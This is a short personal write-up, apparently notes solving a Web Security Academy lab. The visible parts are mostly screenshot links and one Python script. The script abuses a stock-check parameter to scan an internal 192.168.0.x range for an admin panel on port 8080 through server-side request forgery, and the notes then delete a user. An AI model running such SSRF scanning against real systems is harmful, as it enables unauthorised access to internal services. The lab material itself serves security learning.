
![[Pasted image 20251213202214.png]]

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`
![[Pasted image 20251213202229.png]]


so we can use to bruteforce attack for find admin ip
![[Pasted image 20251213202322.png]]

```
import requests

  

URL = "https://0a61007c043c118781340cbe00ff00cf.web-security-academy.net/product/stock"

SESSION_COOKIE = "TWYQD088u1RBHuhIQC9jhWbeT3o2PX6m"

  

HEADERS = {

    "User-Agent": "Mozilla/5.0",

    "Content-Type": "application/x-www-form-urlencoded",

    "Accept": "*/*",

    "Origin": "https://0a61007c043c118781340cbe00ff00cf.web-security-academy.net",

    "Referer": "https://0a61007c043c118781340cbe00ff00cf.web-security-academy.net/product?productId=2"

}

  

COOKIES = {

    "session": SESSION_COOKIE

}

  

def test_ip(ip):

    data = {

        "stockApi": f"http://{ip}:8080/admin"

    }

  

    try:

        r = requests.post(

            URL,

            headers=HEADERS,

            cookies=COOKIES,

            data=data,

            timeout=8

        )

        return r.status_code

    except requests.RequestException:

        return None

  

def main():

    print("[*] Starting SSRF internal IP discovery...\n")

  

    for i in range(2, 256):

        ip = f"192.168.0.{i}"

        status = test_ip(ip)

  

        if status == 400:

            print(f"[+] VALID internal host found → {ip} (status 400)")

        elif status == 500:

            print(f"[-] {ip} invalid (500)")

        else:

            print(f"[?] {ip} unexpected response: {status}")

  

if __name__ == "__main__":

    main()
```


![[Pasted image 20251213202405.png]]


web page source code
![[Pasted image 20251213202452.png]]

delete 'carlos'
![[Pasted image 20251213202529.png]]

check again admin panel
![[Pasted image 20251213202612.png]]


![[Pasted image 20251213202746.png]]
